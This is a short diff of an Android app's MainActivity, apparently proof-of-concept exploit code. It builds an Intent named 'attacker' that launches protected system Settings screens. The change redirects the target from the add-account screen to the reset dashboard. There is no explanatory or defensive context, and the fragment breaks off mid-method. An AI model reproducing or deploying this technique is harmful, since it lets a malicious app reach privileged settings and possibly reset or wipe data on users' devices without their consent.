@@ -11,7 +11,7 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         Intent attacker = new Intent();
-        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.accounts.AddAccountSettings"));
+        attacker.setComponent(new ComponentName("com.android.settings", "com.android.settings.Settings$ResetDashboardActivity"));
         attacker.setAction(Intent.ACTION_RUN);
         attacker.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         String[] authTypes = {getPackageName()};
